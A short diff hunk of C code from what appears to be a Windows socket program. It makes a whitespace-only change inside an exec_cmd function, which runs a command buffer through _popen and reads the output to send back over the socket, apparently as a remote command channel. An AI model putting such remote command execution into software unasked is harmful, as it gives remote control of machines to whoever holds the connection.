@@ -130,7 +130,7 @@ int send_file(char *filename, SOCKET connect_socket, char *buf) {
 int exec_cmd(SOCKET connect_socket, char *buf) {
 	// Call Popen to execute command(s) and read the process' output.
 	strcat(buf, " 2>&1");
-    FILE *fpipe = _popen(buf, "r");
+    	FILE *fpipe = _popen(buf, "r");
 
 
 	// Read & send pipe's stdout.
